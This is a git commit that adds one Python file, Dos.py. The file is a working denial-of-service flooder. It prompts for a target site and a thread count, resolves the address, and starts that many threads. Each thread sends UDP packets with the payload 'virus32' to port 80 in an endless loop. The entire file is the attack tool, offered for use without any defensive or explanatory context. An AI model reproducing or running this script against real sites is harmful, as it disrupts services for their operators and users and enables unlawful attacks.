c5f9cf3659229d5ba17f3b7b45462d81c3cc9eae
AMI-NOT <122160679+AMI-NOT@users.noreply.github.com>
2023-01-08 12:27:36 +0330

    Add files via upload

---
+++ Dos.py
@@ -0,0 +1,25 @@
+
+import time
+import socket
+import sys
+import _thread
+site = input("Enter your site url => ")
+thread_count = input("Enter your thread => ")
+ip = socket.gethostbyname(site)
+UDP_PORT = 80
+MESSAGE = 'virus32'
+print("UDP target IP:", ip)
+print("UDP target port:", UDP_PORT)
+time.sleep(3)
+def ddos(i):
+    while 1:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        print("Packet Sent")
+for i in range(int(thread_count)):
+    try:
+        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
+    except KeyboardInterrupt:
+        sys.exit(0)
+while 1:
+    pass
